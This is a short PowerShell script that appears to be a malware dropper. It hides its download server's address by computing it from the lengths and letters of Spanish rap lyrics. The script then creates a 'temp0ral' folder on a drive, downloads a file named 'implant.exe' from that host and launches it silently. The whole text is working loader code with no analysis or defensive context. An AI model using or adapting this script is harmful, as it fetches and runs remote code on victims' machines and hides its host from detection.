$str1 = "Me acostumbré al sour, ya no patea" #34
$str2 = "Me llegan a casa, no se capean" #30
$str3 = "Solo modelos como Barea" #23
$str4 = "Multiplicar cienes es la tarea" #30
$str5 = "Yo soy el cacique en tu propia aldea"
$str6 = "Valgo más que todo lo que te rodea" #34
$str7 = "No te la crea, recuerda que Curry la mete" #41
$str8 = "Hasta que Lebron lo galdea" #26

$add = ($str7.Length - $str3.Length + 1).ToString() + ($str1.Length - $str4.Length - 2).ToString() + "." + ($str7.Length - 1 + $str4.Length + $str2.Length + $str6.Length + $str1.Length).ToString() + "." + ($str4.Length - $str2.Length).ToString() + "." + ($str1.Length + $str4.Length + $str6.Length + 2).ToString()
$head = "h" + $str1[31] + $str4[25] + $str2[26] + "://" + $add + ":" + $str8.IndexOf("e") + $str5.IndexOf("Y") + $str8.IndexOf("e") + $str2.IndexOf("M")

$call = "/" + "implant.exe" 
$carpeta = "temp0ral\"
$malw = "implant.exe"
$unidadRed = [System.IO.DriveInfo]::GetDrives()

foreach ($i in $unidadRed) {
    $existe = Test-Path ($i.Name + $carpeta)
    if ($existe -eq $false) 
    {
        New-Item -Path ($i.Name + $carpeta) -ItemType Directory
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($head + $call, ($i.Name + $carpeta + $malw))
        Start-Process -FilePath ($i.Name + $carpeta + $malw) -NoNewWindow
        break        
    }
    else
    {
        Start-Process -FilePath ($i.Name + $carpeta + $malw) -NoNewWindow
        break  
    }
}
